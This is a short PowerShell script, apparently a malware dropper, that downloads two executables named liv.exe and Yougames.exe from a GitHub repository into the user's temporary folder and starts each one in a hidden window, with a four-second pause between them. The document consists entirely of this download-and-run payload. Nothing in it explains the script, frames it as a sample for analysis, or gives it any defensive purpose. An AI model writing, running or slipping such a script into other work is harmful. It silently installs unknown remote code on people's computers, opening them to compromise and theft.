
(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/jar/raw/refs/heads/main/liv.exe', "$env:TEMP\liv.exe");
Start-Process "$env:TEMP\liv.exe" -WindowStyle Hidden


Start-Sleep -Seconds 4


(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/jar/raw/refs/heads/main/Yougames.exe', "$env:TEMP\Yougames.exe");
Start-Process "$env:TEMP\Yougames.exe" -WindowStyle Hidden
